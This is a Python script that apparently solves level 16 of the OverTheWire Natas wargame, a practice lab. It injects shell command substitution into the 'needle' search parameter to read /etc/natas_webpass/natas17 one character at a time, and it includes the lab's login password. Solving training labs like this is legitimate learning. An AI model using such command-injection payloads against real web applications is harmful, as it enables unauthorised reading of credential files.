#! /usr/bin/python

'''
http://docs.python-requests.org/en/latest/
'''

# Idea from: http://seanmurphree.com/blog/?p=364

import requests
from requests.auth import HTTPBasicAuth

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

url = "http://natas16.natas.labs.overthewire.org/index.php"
username = "natas16"
password = "3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3L"

'''
Pattern for the needle:
if [ $(cut -cN-N < /etc/natas_webpass/natas17) = C ]
then
echo Xmas
else
echo 0
fi
'''

pattern = "$(if [ $(cut -c%d-%d < /etc/natas_webpass/natas17) = %c ]\nthen\necho Xmas\nelse\necho 0\nfi)"

# guess every one of the 32 letters of the password
next_passw = ['-' for i in range(0,32)]


for i in range(1, 33):
    for j in charset:
        needle = pattern % (i, i, j)
        get_url = url + "?needle=" + needle + "&submit=Search"

        resp = requests.get(get_url, auth = HTTPBasicAuth(username, password))
        #print "Ret code: ", resp.status_code, resp.reason
        #print "Headers: ", resp.headers
        if "Xmas" in resp.text:
            print  "Found passw[%d] = %c" % (i-1, j)
            next_passw[i-1] = j;
            break

print "natas17 password: ", "".join(next_passw)

